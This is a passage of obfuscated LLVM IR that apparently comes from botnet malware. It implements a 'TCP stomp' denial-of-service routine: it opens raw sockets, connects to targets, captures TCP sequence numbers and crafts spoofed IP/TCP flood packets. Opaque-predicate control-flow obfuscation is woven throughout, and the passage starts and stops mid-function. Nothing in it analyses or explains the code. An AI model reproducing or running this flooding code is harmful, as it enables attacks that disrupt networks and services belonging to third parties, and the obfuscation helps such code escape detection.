  %_22 = sub i32 0, %660
  %gen23 = add i32 %_22, 1
  %_24 = sub i32 %660, 1
  %gen25 = mul i32 %_24, 1
  %_26 = shl i32 %660, 1
  %_27 = sub i32 %660, 1
  %gen28 = mul i32 %_27, 1
  %_29 = shl i32 %660, 1
  %661 = add nsw i32 %660, 1
  store i32 %661, i32* %11, align 4
  br label %originalBB19

originalBB33alteredBB:                            ; preds = %originalBB33, %347
  %662 = load i8**, i8*** %13, align 8
  %663 = load i32, i32* %11, align 4
  %664 = sext i32 %663 to i64
  %665 = getelementptr inbounds i8*, i8** %662, i64 %664
  %666 = load i8*, i8** %665, align 8
  store i8* %666, i8** %35, align 8
  %667 = load i8*, i8** %35, align 8
  %668 = bitcast i8* %667 to %struct.iphdr*
  store %struct.iphdr* %668, %struct.iphdr** %36, align 8
  %669 = load %struct.iphdr*, %struct.iphdr** %36, align 8
  %670 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %669, i64 1
  %671 = bitcast %struct.iphdr* %670 to %struct.tcphdr*
  store %struct.tcphdr* %671, %struct.tcphdr** %37, align 8
  %672 = load %struct.tcphdr*, %struct.tcphdr** %37, align 8
  %673 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %672, i64 1
  %674 = bitcast %struct.tcphdr* %673 to i8*
  store i8* %674, i8** %38, align 8
  %675 = load %struct.attack_target*, %struct.attack_target** %8, align 8
  %676 = load i32, i32* %11, align 4
  %677 = sext i32 %676 to i64
  %678 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %675, i64 %677
  %679 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %678, i32 0, i32 2
  %680 = load i8, i8* %679, align 4
  %681 = zext i8 %680 to i32
  %682 = icmp slt i32 %681, 32
  br label %originalBB33

originalBB37alteredBB:                            ; preds = %originalBB37, %406
  %683 = load i32, i32* %30, align 4
  %684 = icmp eq i32 %683, -1
  br label %originalBB37

originalBB41alteredBB:                            ; preds = %originalBB41, %425
  %685 = call i32 @rand_next()
  %686 = load %struct.iphdr*, %struct.iphdr** %36, align 8
  %687 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %686, i32 0, i32 8
  store i32 %685, i32* %687, align 4
  br label %originalBB41

originalBB45alteredBB:                            ; preds = %originalBB45, %455
  %688 = load i16, i16* %18, align 2
  %689 = zext i16 %688 to i32
  %690 = icmp eq i32 %689, 65535
  br label %originalBB45

originalBB49alteredBB:                            ; preds = %originalBB49, %491
  %691 = load i32, i32* %20, align 4
  %692 = icmp eq i32 %691, 65535
  br label %originalBB49

originalBB53alteredBB:                            ; preds = %originalBB53, %510
  %693 = call i32 @rand_next()
  %694 = load %struct.tcphdr*, %struct.tcphdr** %37, align 8
  %695 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %694, i32 0, i32 2
  store i32 %693, i32* %695, align 4
  br label %originalBB53

originalBB57alteredBB:                            ; preds = %originalBB57, %596
  %696 = load i32, i32* %11, align 4
  %_58 = sub i32 0, %696
  %gen59 = add i32 %_58, 1
  %_60 = sub i32 %696, 1
  %gen61 = mul i32 %_60, 1
  %_62 = sub i32 0, %696
  %gen63 = add i32 %_62, 1
  %_64 = sub i32 %696, 1
  %gen65 = mul i32 %_64, 1
  %_66 = shl i32 %696, 1
  %_67 = sub i32 %696, 1
  %gen68 = mul i32 %_67, 1
  %_69 = shl i32 %696, 1
  %697 = add nsw i32 %696, 1
  store i32 %697, i32* %11, align 4
  br label %originalBB57

originalBB73alteredBB:                            ; preds = %originalBB73, %615
  %698 = call i64 @time(i64* null) #6
  %699 = load i32, i32* %31, align 4
  %700 = sext i32 %699 to i64
  %701 = icmp sgt i64 %698, %700
  br label %originalBB73

originalBB77alteredBB:                            ; preds = %originalBB77, %638
  br label %originalBB77
}

; Function Attrs: noinline nounwind uwtable
define void @attack_tcp_stomp(i32, i8 zeroext, %struct.attack_target*, i8 zeroext, %struct.attack_option*) #0 {
  %6 = alloca i32, align 4
  %7 = alloca i8, align 1
  %8 = alloca %struct.attack_target*, align 8
  %9 = alloca i8, align 1
  %10 = alloca %struct.attack_option*, align 8
  %11 = alloca i32, align 4
  %12 = alloca i32, align 4
  %13 = alloca %struct.attack_stomp_data*, align 8
  %14 = alloca i8**, align 8
  %15 = alloca i8, align 1
  %16 = alloca i16, align 2
  %17 = alloca i8, align 1
  %18 = alloca i8, align 1
  %19 = alloca i16, align 2
  %20 = alloca i8, align 1
  %21 = alloca i8, align 1
  %22 = alloca i8, align 1
  %23 = alloca i8, align 1
  %24 = alloca i8, align 1
  %25 = alloca i8, align 1
  %26 = alloca i32, align 4
  %27 = alloca i8, align 1
  %28 = alloca i32, align 4
  %29 = alloca i32, align 4
  %30 = alloca %struct.sockaddr_in, align 4
  %31 = alloca %struct.sockaddr_in, align 4
  %32 = alloca i32, align 4
  %33 = alloca [256 x i8], align 16
  %34 = alloca i64, align 8
  %35 = alloca %union.__CONST_SOCKADDR_ARG, align 8
  %36 = alloca i32, align 4
  %37 = alloca %union.__CONST_SOCKADDR_ARG, align 8
  %38 = alloca %struct.tcphdr*, align 8
  %39 = alloca %struct.iphdr*, align 8
  %40 = alloca %struct.tcphdr*, align 8
  %41 = alloca i8*, align 8
  %42 = alloca i8*, align 8
  %43 = alloca %struct.iphdr*, align 8
  %44 = alloca %struct.tcphdr*, align 8
  %45 = alloca i8*, align 8
  %46 = alloca %union.__CONST_SOCKADDR_ARG, align 8
  store i32 %0, i32* %6, align 4
  store i8 %1, i8* %7, align 1
  store %struct.attack_target* %2, %struct.attack_target** %8, align 8
  store i8 %3, i8* %9, align 1
  store %struct.attack_option* %4, %struct.attack_option** %10, align 8
  store i32 0, i32* %11, align 4
  store i32 0, i32* %12, align 4
  %47 = load i8, i8* %7, align 1
  %48 = zext i8 %47 to i64
  %49 = call noalias i8* @calloc(i64 %48, i64 16) #6
  %50 = bitcast i8* %49 to %struct.attack_stomp_data*
  store %struct.attack_stomp_data* %50, %struct.attack_stomp_data** %13, align 8
  %51 = load i8, i8* %7, align 1
  %52 = zext i8 %51 to i64
  %53 = call noalias i8* @calloc(i64 %52, i64 8) #6
  %54 = bitcast i8* %53 to i8**
  store i8** %54, i8*** %14, align 8
  %55 = load i8, i8* %9, align 1
  %56 = load %struct.attack_option*, %struct.attack_option** %10, align 8
  %57 = call i32 @attack_get_opt_int(i8 zeroext %55, %struct.attack_option* %56, i8 zeroext 2, i32 0)
  %58 = trunc i32 %57 to i8
  store i8 %58, i8* %15, align 1
  %59 = load i8, i8* %9, align 1
  %60 = load %struct.attack_option*, %struct.attack_option** %10, align 8
  %61 = call i32 @attack_get_opt_int(i8 zeroext %59, %struct.attack_option* %60, i8 zeroext 3, i32 65535)
  %62 = trunc i32 %61 to i16
  store i16 %62, i16* %16, align 2
  %63 = load i8, i8* %9, align 1
  %64 = load %struct.attack_option*, %struct.attack_option** %10, align 8
  %65 = call i32 @attack_get_opt_int(i8 zeroext %63, %struct.attack_option* %64, i8 zeroext 4, i32 64)
  %66 = trunc i32 %65 to i8
  store i8 %66, i8* %17, align 1
  %67 = load i8, i8* %9, align 1
  %68 = load %struct.attack_option*, %struct.attack_option** %10, align 8
  %69 = call i32 @attack_get_opt_int(i8 zeroext %67, %struct.attack_option* %68, i8 zeroext 5, i32 1)
  %70 = trunc i32 %69 to i8
  store i8 %70, i8* %18, align 1
  %71 = load i8, i8* %9, align 1
  %72 = load %struct.attack_option*, %struct.attack_option** %10, align 8
  %73 = call i32 @attack_get_opt_int(i8 zeroext %71, %struct.attack_option* %72, i8 zeroext 7, i32 65535)
  %74 = trunc i32 %73 to i16
  store i16 %74, i16* %19, align 2
  %75 = load i8, i8* %9, align 1
  %76 = load %struct.attack_option*, %struct.attack_option** %10, align 8
  %77 = call i32 @attack_get_opt_int(i8 zeroext %75, %struct.attack_option* %76, i8 zeroext 10, i32 0)
  %78 = trunc i32 %77 to i8
  store i8 %78, i8* %20, align 1
  %79 = load i8, i8* %9, align 1
  %80 = load %struct.attack_option*, %struct.attack_option** %10, align 8
  %81 = call i32 @attack_get_opt_int(i8 zeroext %79, %struct.attack_option* %80, i8 zeroext 11, i32 1)
  %82 = trunc i32 %81 to i8
  store i8 %82, i8* %21, align 1
  %83 = load i8, i8* %9, align 1
  %84 = load %struct.attack_option*, %struct.attack_option** %10, align 8
  %85 = call i32 @attack_get_opt_int(i8 zeroext %83, %struct.attack_option* %84, i8 zeroext 12, i32 1)
  %86 = trunc i32 %85 to i8
  store i8 %86, i8* %22, align 1
  %87 = load i8, i8* %9, align 1
  %88 = load %struct.attack_option*, %struct.attack_option** %10, align 8
  %89 = call i32 @attack_get_opt_int(i8 zeroext %87, %struct.attack_option* %88, i8 zeroext 13, i32 0)
  %90 = trunc i32 %89 to i8
  store i8 %90, i8* %23, align 1
  %91 = load i8, i8* %9, align 1
  %92 = load %struct.attack_option*, %struct.attack_option** %10, align 8
  %93 = call i32 @attack_get_opt_int(i8 zeroext %91, %struct.attack_option* %92, i8 zeroext 14, i32 0)
  %94 = trunc i32 %93 to i8
  store i8 %94, i8* %24, align 1
  %95 = load i8, i8* %9, align 1
  %96 = load %struct.attack_option*, %struct.attack_option** %10, align 8
  %97 = call i32 @attack_get_opt_int(i8 zeroext %95, %struct.attack_option* %96, i8 zeroext 15, i32 0)
  %98 = trunc i32 %97 to i8
  store i8 %98, i8* %25, align 1
  %99 = load i8, i8* %9, align 1
  %100 = load %struct.attack_option*, %struct.attack_option** %10, align 8
  %101 = call i32 @attack_get_opt_int(i8 zeroext %99, %struct.attack_option* %100, i8 zeroext 0, i32 768)
  store i32 %101, i32* %26, align 4
  %102 = load i8, i8* %9, align 1
  %103 = load %struct.attack_option*, %struct.attack_option** %10, align 8
  %104 = call i32 @attack_get_opt_int(i8 zeroext %102, %struct.attack_option* %103, i8 zeroext 1, i32 1)
  %105 = trunc i32 %104 to i8
  store i8 %105, i8* %27, align 1
  %106 = call i64 @time(i64* null) #6
  %107 = load i32, i32* %6, align 4
  %108 = sext i32 %107 to i64
  %109 = add nsw i64 %106, %108
  %110 = trunc i64 %109 to i32
  store i32 %110, i32* %28, align 4
  %111 = call i32 @socket(i32 2, i32 3, i32 6) #6
  store i32 %111, i32* %12, align 4
  %112 = icmp eq i32 %111, -1
  br i1 %112, label %113, label %114

; <label>:113:                                    ; preds = %5
  br label %805

; <label>:114:                                    ; preds = %5
  store i32 1, i32* %11, align 4
  %115 = load i32, i32* %12, align 4
  %116 = bitcast i32* %11 to i8*
  %117 = call i32 @setsockopt(i32 %115, i32 0, i32 3, i8* %116, i32 4) #6
  %118 = icmp eq i32 %117, -1
  br i1 %118, label %119, label %138

; <label>:119:                                    ; preds = %114
  %120 = load i32, i32* @x.27
  %121 = load i32, i32* @y.28
  %122 = sub i32 %120, 1
  %123 = mul i32 %120, %122
  %124 = urem i32 %123, 2
  %125 = icmp eq i32 %124, 0
  %126 = icmp slt i32 %121, 10
  %127 = or i1 %125, %126
  br i1 %127, label %originalBB, label %originalBBalteredBB

originalBB:                                       ; preds = %originalBBalteredBB, %119
  %128 = load i32, i32* %12, align 4
  %129 = call i32 @close(i32 %128)
  %130 = load i32, i32* @x.27
  %131 = load i32, i32* @y.28
  %132 = sub i32 %130, 1
  %133 = mul i32 %130, %132
  %134 = urem i32 %133, 2
  %135 = icmp eq i32 %134, 0
  %136 = icmp slt i32 %131, 10
  %137 = or i1 %135, %136
  br i1 %137, label %originalBBpart2, label %originalBBalteredBB

originalBBpart2:                                  ; preds = %originalBB
  br label %805

; <label>:138:                                    ; preds = %114
  store i32 0, i32* %11, align 4
  br label %139

; <label>:139:                                    ; preds = %600, %138
  %140 = load i32, i32* %11, align 4
  %141 = load i8, i8* %7, align 1
  %142 = zext i8 %141 to i32
  %143 = icmp slt i32 %140, %142
  br i1 %143, label %144, label %603

; <label>:144:                                    ; preds = %139
  %145 = load i32, i32* @x.27
  %146 = load i32, i32* @y.28
  %147 = sub i32 %145, 1
  %148 = mul i32 %145, %147
  %149 = urem i32 %148, 2
  %150 = icmp eq i32 %149, 0
  %151 = icmp slt i32 %146, 10
  %152 = or i1 %150, %151
  br i1 %152, label %originalBB1, label %originalBB1alteredBB

originalBB1:                                      ; preds = %originalBB1alteredBB, %144
  store i32 0, i32* %29, align 4
  %153 = load i32, i32* @x.27
  %154 = load i32, i32* @y.28
  %155 = sub i32 %153, 1
  %156 = mul i32 %153, %155
  %157 = urem i32 %156, 2
  %158 = icmp eq i32 %157, 0
  %159 = icmp slt i32 %154, 10
  %160 = or i1 %158, %159
  br i1 %160, label %originalBBpart24, label %originalBB1alteredBB

originalBBpart24:                                 ; preds = %originalBB1
  br label %161

; <label>:161:                                    ; preds = %595, %584, %originalBBpart24
  %162 = call i32 @socket(i32 2, i32 1, i32 0) #6
  store i32 %162, i32* %29, align 4
  %163 = icmp eq i32 %162, -1
  br i1 %163, label %164, label %181

; <label>:164:                                    ; preds = %161
  %165 = load i32, i32* @x.27
  %166 = load i32, i32* @y.28
  %167 = sub i32 %165, 1
  %168 = mul i32 %165, %167
  %169 = urem i32 %168, 2
  %170 = icmp eq i32 %169, 0
  %171 = icmp slt i32 %166, 10
  %172 = or i1 %170, %171
  br i1 %172, label %originalBB6, label %originalBB6alteredBB

originalBB6:                                      ; preds = %originalBB6alteredBB, %164
  %173 = load i32, i32* @x.27
  %174 = load i32, i32* @y.28
  %175 = sub i32 %173, 1
  %176 = mul i32 %173, %175
  %177 = urem i32 %176, 2
  %178 = icmp eq i32 %177, 0
  %179 = icmp slt i32 %174, 10
  %180 = or i1 %178, %179
  br i1 %180, label %originalBBpart28, label %originalBB6alteredBB

originalBBpart28:                                 ; preds = %originalBB6
  br label %600

; <label>:181:                                    ; preds = %161
  %182 = load i32, i32* %29, align 4
  %183 = load i32, i32* %29, align 4
  %184 = call i32 (i32, i32, ...) @fcntl(i32 %183, i32 3, i32 0)
  %185 = or i32 %184, 2048
  %186 = call i32 (i32, i32, ...) @fcntl(i32 %182, i32 4, i32 %185)
  %187 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %30, i32 0, i32 0
  store i16 2, i16* %187, align 4
  %188 = load %struct.attack_target*, %struct.attack_target** %8, align 8
  %189 = load i32, i32* %11, align 4
  %190 = sext i32 %189 to i64
  %191 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %188, i64 %190
  %192 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %191, i32 0, i32 2
  %193 = load i8, i8* %192, align 4
  %194 = zext i8 %193 to i32
  %195 = icmp slt i32 %194, 32
  br i1 %195, label %196, label %217

; <label>:196:                                    ; preds = %181
  %197 = load %struct.attack_target*, %struct.attack_target** %8, align 8
  %198 = load i32, i32* %11, align 4
  %199 = sext i32 %198 to i64
  %200 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %197, i64 %199
  %201 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %200, i32 0, i32 1
  %202 = load i32, i32* %201, align 4
  %203 = call i32 @ntohl(i32 %202) #7
  %204 = call i32 @rand_next()
  %205 = load %struct.attack_target*, %struct.attack_target** %8, align 8
  %206 = load i32, i32* %11, align 4
  %207 = sext i32 %206 to i64
  %208 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %205, i64 %207
  %209 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %208, i32 0, i32 2
  %210 = load i8, i8* %209, align 4
  %211 = zext i8 %210 to i32
  %212 = lshr i32 %204, %211
  %213 = add i32 %203, %212
  %214 = call i32 @htonl(i32 %213) #7
  %215 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %30, i32 0, i32 2
  %216 = getelementptr inbounds %struct.in_addr, %struct.in_addr* %215, i32 0, i32 0
  store i32 %214, i32* %216, align 4
  br label %242

; <label>:217:                                    ; preds = %181
  %218 = load i32, i32* @x.27
  %219 = load i32, i32* @y.28
  %220 = sub i32 %218, 1
  %221 = mul i32 %218, %220
  %222 = urem i32 %221, 2
  %223 = icmp eq i32 %222, 0
  %224 = icmp slt i32 %219, 10
  %225 = or i1 %223, %224
  br i1 %225, label %originalBB10, label %originalBB10alteredBB

originalBB10:                                     ; preds = %originalBB10alteredBB, %217
  %226 = load %struct.attack_target*, %struct.attack_target** %8, align 8
  %227 = load i32, i32* %11, align 4
  %228 = sext i32 %227 to i64
  %229 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %226, i64 %228
  %230 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %229, i32 0, i32 1
  %231 = load i32, i32* %230, align 4
  %232 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %30, i32 0, i32 2
  %233 = getelementptr inbounds %struct.in_addr, %struct.in_addr* %232, i32 0, i32 0
  store i32 %231, i32* %233, align 4
  %234 = load i32, i32* @x.27
  %235 = load i32, i32* @y.28
  %236 = sub i32 %234, 1
  %237 = mul i32 %234, %236
  %238 = urem i32 %237, 2
  %239 = icmp eq i32 %238, 0
  %240 = icmp slt i32 %235, 10
  %241 = or i1 %239, %240
  br i1 %241, label %originalBBpart212, label %originalBB10alteredBB

originalBBpart212:                                ; preds = %originalBB10
  br label %242

; <label>:242:                                    ; preds = %originalBBpart212, %196
  %243 = load i16, i16* %19, align 2
  %244 = zext i16 %243 to i32
  %245 = icmp eq i32 %244, 65535
  br i1 %245, label %246, label %251

; <label>:246:                                    ; preds = %242
  %247 = call i32 @rand_next()
  %248 = and i32 %247, 65535
  %249 = trunc i32 %248 to i16
  %250 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %30, i32 0, i32 1
  store i16 %249, i16* %250, align 2
  br label %255

; <label>:251:                                    ; preds = %242
  %252 = load i16, i16* %19, align 2
  %253 = call zeroext i16 @htons(i16 zeroext %252) #7
  %254 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %30, i32 0, i32 1
  store i16 %253, i16* %254, align 2
  br label %255

; <label>:255:                                    ; preds = %251, %246
  %256 = load i32, i32* %29, align 4
  %257 = bitcast %union.__CONST_SOCKADDR_ARG* %35 to %struct.sockaddr**
  %258 = bitcast %struct.sockaddr_in* %30 to %struct.sockaddr*
  store %struct.sockaddr* %258, %struct.sockaddr** %257, align 8
  %259 = getelementptr inbounds %union.__CONST_SOCKADDR_ARG, %union.__CONST_SOCKADDR_ARG* %35, i32 0, i32 0
  %260 = load %struct.sockaddr*, %struct.sockaddr** %259, align 8
  %261 = call i32 @connect(i32 %256, %struct.sockaddr* %260, i32 16)
  %262 = call i64 @time(i64* null) #6
  store i64 %262, i64* %34, align 8
  br label %263

; <label>:263:                                    ; preds = %598, %255
  store i32 0, i32* %36, align 4
  store i32 16, i32* %32, align 4
  %264 = load i32, i32* %12, align 4
  %265 = getelementptr inbounds [256 x i8], [256 x i8]* %33, i32 0, i32 0
  %266 = bitcast %union.__CONST_SOCKADDR_ARG* %37 to %struct.sockaddr**
  %267 = bitcast %struct.sockaddr_in* %31 to %struct.sockaddr*
  store %struct.sockaddr* %267, %struct.sockaddr** %266, align 8
  %268 = getelementptr inbounds %union.__CONST_SOCKADDR_ARG, %union.__CONST_SOCKADDR_ARG* %37, i32 0, i32 0
  %269 = load %struct.sockaddr*, %struct.sockaddr** %268, align 8
  %270 = call i64 @recvfrom(i32 %264, i8* %265, i64 256, i32 16384, %struct.sockaddr* %269, i32* %32)
  %271 = trunc i64 %270 to i32
  store i32 %271, i32* %36, align 4
  %272 = load i32, i32* %36, align 4
  %273 = icmp eq i32 %272, -1
  br i1 %273, label %274, label %275

; <label>:274:                                    ; preds = %263
  br label %805

; <label>:275:                                    ; preds = %263
  %276 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %31, i32 0, i32 2
  %277 = getelementptr inbounds %struct.in_addr, %struct.in_addr* %276, i32 0, i32 0
  %278 = load i32, i32* %277, align 4
  %279 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %30, i32 0, i32 2
  %280 = getelementptr inbounds %struct.in_addr, %struct.in_addr* %279, i32 0, i32 0
  %281 = load i32, i32* %280, align 4
  %282 = icmp eq i32 %278, %281
  br i1 %282, label %283, label %590

; <label>:283:                                    ; preds = %275
  %284 = load i32, i32* %36, align 4
  %285 = sext i32 %284 to i64
  %286 = icmp ugt i64 %285, 40
  br i1 %286, label %287, label %590

; <label>:287:                                    ; preds = %283
  %288 = getelementptr inbounds [256 x i8], [256 x i8]* %33, i32 0, i32 0
  %289 = getelementptr inbounds i8, i8* %288, i64 20
  %290 = bitcast i8* %289 to %struct.tcphdr*
  store %struct.tcphdr* %290, %struct.tcphdr** %38, align 8
  %291 = load %struct.tcphdr*, %struct.tcphdr** %38, align 8
  %292 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %291, i32 0, i32 0
  %293 = load i16, i16* %292, align 4
  %294 = zext i16 %293 to i32
  %295 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %30, i32 0, i32 1
  %296 = load i16, i16* %295, align 2
  %297 = zext i16 %296 to i32
  %298 = icmp eq i32 %294, %297
  br i1 %298, label %299, label %589

; <label>:299:                                    ; preds = %287
  %300 = load %struct.tcphdr*, %struct.tcphdr** %38, align 8
  %301 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %300, i32 0, i32 4
  %302 = load i16, i16* %301, align 4
  %303 = lshr i16 %302, 9
  %304 = and i16 %303, 1
  %305 = zext i16 %304 to i32
  %306 = icmp ne i32 %305, 0
  br i1 %306, label %307, label %552

; <label>:307:                                    ; preds = %299
  %308 = load %struct.tcphdr*, %struct.tcphdr** %38, align 8
  %309 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %308, i32 0, i32 4
  %310 = load i16, i16* %309, align 4
  %311 = lshr i16 %310, 12
  %312 = and i16 %311, 1
  %313 = zext i16 %312 to i32
  %314 = icmp ne i32 %313, 0
  br i1 %314, label %315, label %552

; <label>:315:                                    ; preds = %307
  %316 = load i32, i32* @x.27
  %317 = load i32, i32* @y.28
  %318 = sub i32 %316, 1
  %319 = mul i32 %316, %318
  %320 = urem i32 %319, 2
  %321 = icmp eq i32 %320, 0
  %322 = icmp slt i32 %317, 10
  %323 = or i1 %321, %322
  br i1 %323, label %originalBB14, label %originalBB14alteredBB

originalBB14:                                     ; preds = %originalBB14alteredBB, %315
  %324 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %30, i32 0, i32 2
  %325 = getelementptr inbounds %struct.in_addr, %struct.in_addr* %324, i32 0, i32 0
  %326 = load i32, i32* %325, align 4
  %327 = load %struct.attack_stomp_data*, %struct.attack_stomp_data** %13, align 8
  %328 = load i32, i32* %11, align 4
  %329 = sext i32 %328 to i64
  %330 = getelementptr inbounds %struct.attack_stomp_data, %struct.attack_stomp_data* %327, i64 %329
  %331 = getelementptr inbounds %struct.attack_stomp_data, %struct.attack_stomp_data* %330, i32 0, i32 0
  store i32 %326, i32* %331, align 4
  %332 = load %struct.tcphdr*, %struct.tcphdr** %40, align 8
  %333 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %332, i32 0, i32 2
  %334 = load i32, i32* %333, align 4
  %335 = call i32 @ntohl(i32 %334) #7
  %336 = load %struct.attack_stomp_data*, %struct.attack_stomp_data** %13, align 8
  %337 = load i32, i32* %11, align 4
  %338 = sext i32 %337 to i64
  %339 = getelementptr inbounds %struct.attack_stomp_data, %struct.attack_stomp_data* %336, i64 %338
  %340 = getelementptr inbounds %struct.attack_stomp_data, %struct.attack_stomp_data* %339, i32 0, i32 1
  store i32 %335, i32* %340, align 4
  %341 = load %struct.tcphdr*, %struct.tcphdr** %40, align 8
  %342 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %341, i32 0, i32 3
  %343 = load i32, i32* %342, align 4
  %344 = call i32 @ntohl(i32 %343) #7
  %345 = load %struct.attack_stomp_data*, %struct.attack_stomp_data** %13, align 8
  %346 = load i32, i32* %11, align 4
  %347 = sext i32 %346 to i64
  %348 = getelementptr inbounds %struct.attack_stomp_data, %struct.attack_stomp_data* %345, i64 %347
  %349 = getelementptr inbounds %struct.attack_stomp_data, %struct.attack_stomp_data* %348, i32 0, i32 2
  store i32 %344, i32* %349, align 4
  %350 = load %struct.tcphdr*, %struct.tcphdr** %40, align 8
  %351 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %350, i32 0, i32 1
  %352 = load i16, i16* %351, align 2
  %353 = load %struct.attack_stomp_data*, %struct.attack_stomp_data** %13, align 8
  %354 = load i32, i32* %11, align 4
  %355 = sext i32 %354 to i64
  %356 = getelementptr inbounds %struct.attack_stomp_data, %struct.attack_stomp_data* %353, i64 %355
  %357 = getelementptr inbounds %struct.attack_stomp_data, %struct.attack_stomp_data* %356, i32 0, i32 3
  store i16 %352, i16* %357, align 4
  %358 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %30, i32 0, i32 1
  %359 = load i16, i16* %358, align 2
  %360 = load %struct.attack_stomp_data*, %struct.attack_stomp_data** %13, align 8
  %361 = load i32, i32* %11, align 4
  %362 = sext i32 %361 to i64
  %363 = getelementptr inbounds %struct.attack_stomp_data, %struct.attack_stomp_data* %360, i64 %362
  %364 = getelementptr inbounds %struct.attack_stomp_data, %struct.attack_stomp_data* %363, i32 0, i32 4
  store i16 %359, i16* %364, align 2
  %365 = load i32, i32* %26, align 4
  %366 = sext i32 %365 to i64
  %367 = add i64 40, %366
  %368 = call noalias i8* @malloc(i64 %367) #6
  %369 = load i8**, i8*** %14, align 8
  %370 = load i32, i32* %11, align 4
  %371 = sext i32 %370 to i64
  %372 = getelementptr inbounds i8*, i8** %369, i64 %371
  store i8* %368, i8** %372, align 8
  %373 = load i8**, i8*** %14, align 8
  %374 = load i32, i32* %11, align 4
  %375 = sext i32 %374 to i64
  %376 = getelementptr inbounds i8*, i8** %373, i64 %375
  %377 = load i8*, i8** %376, align 8
  %378 = bitcast i8* %377 to %struct.iphdr*
  store %struct.iphdr* %378, %struct.iphdr** %39, align 8
  %379 = load %struct.iphdr*, %struct.iphdr** %39, align 8
  %380 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %379, i64 1
  %381 = bitcast %struct.iphdr* %380 to %struct.tcphdr*
  store %struct.tcphdr* %381, %struct.tcphdr** %40, align 8
  %382 = load %struct.tcphdr*, %struct.tcphdr** %40, align 8
  %383 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %382, i64 1
  %384 = bitcast %struct.tcphdr* %383 to i8*
  store i8* %384, i8** %41, align 8
  %385 = load %struct.iphdr*, %struct.iphdr** %39, align 8
  %386 = bitcast %struct.iphdr* %385 to i8*
  %387 = load i8, i8* %386, align 4
  %388 = and i8 %387, 15
  %389 = or i8 %388, 64
  store i8 %389, i8* %386, align 4
  %390 = load %struct.iphdr*, %struct.iphdr** %39, align 8
  %391 = bitcast %struct.iphdr* %390 to i8*
  %392 = load i8, i8* %391, align 4
  %393 = and i8 %392, -16
  %394 = or i8 %393, 5
  store i8 %394, i8* %391, align 4
  %395 = load i8, i8* %15, align 1
  %396 = load %struct.iphdr*, %struct.iphdr** %39, align 8
  %397 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %396, i32 0, i32 1
  store i8 %395, i8* %397, align 1
  %398 = load i32, i32* %26, align 4
  %399 = sext i32 %398 to i64
  %400 = add i64 40, %399
  %401 = trunc i64 %400 to i16
  %402 = call zeroext i16 @htons(i16 zeroext %401) #7
  %403 = load %struct.iphdr*, %struct.iphdr** %39, align 8
  %404 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %403, i32 0, i32 2
  store i16 %402, i16* %404, align 2
  %405 = load i16, i16* %16, align 2
  %406 = call zeroext i16 @htons(i16 zeroext %405) #7
  %407 = load %struct.iphdr*, %struct.iphdr** %39, align 8
  %408 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %407, i32 0, i32 3
  store i16 %406, i16* %408, align 4
  %409 = load i8, i8* %17, align 1
  %410 = load %struct.iphdr*, %struct.iphdr** %39, align 8
  %411 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %410, i32 0, i32 5
  store i8 %409, i8* %411, align 4
  %412 = load i8, i8* %18, align 1
  %413 = icmp ne i8 %412, 0
  %414 = load i32, i32* @x.27
  %415 = load i32, i32* @y.28
  %416 = sub i32 %414, 1
  %417 = mul i32 %414, %416
  %418 = urem i32 %417, 2
  %419 = icmp eq i32 %418, 0
  %420 = icmp slt i32 %415, 10
  %421 = or i1 %419, %420
  br i1 %421, label %originalBBpart248, label %originalBB14alteredBB

originalBBpart248:                                ; preds = %originalBB14
  br i1 %413, label %422, label %426

; <label>:422:                                    ; preds = %originalBBpart248
  %423 = call zeroext i16 @htons(i16 zeroext 16384) #7
  %424 = load %struct.iphdr*, %struct.iphdr** %39, align 8
  %425 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %424, i32 0, i32 4
  store i16 %423, i16* %425, align 2
  br label %426

; <label>:426:                                    ; preds = %422, %originalBBpart248
  %427 = load %struct.iphdr*, %struct.iphdr** %39, align 8
  %428 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %427, i32 0, i32 6
  store i8 6, i8* %428, align 1
  %429 = load i32, i32* @LOCAL_ADDR, align 4
  %430 = load %struct.iphdr*, %struct.iphdr** %39, align 8
  %431 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %430, i32 0, i32 8
  store i32 %429, i32* %431, align 4
  %432 = load %struct.attack_stomp_data*, %struct.attack_stomp_data** %13, align 8
  %433 = load i32, i32* %11, align 4
  %434 = sext i32 %433 to i64
  %435 = getelementptr inbounds %struct.attack_stomp_data, %struct.attack_stomp_data* %432, i64 %434
  %436 = getelementptr inbounds %struct.attack_stomp_data, %struct.attack_stomp_data* %435, i32 0, i32 0
  %437 = load i32, i32* %436, align 4
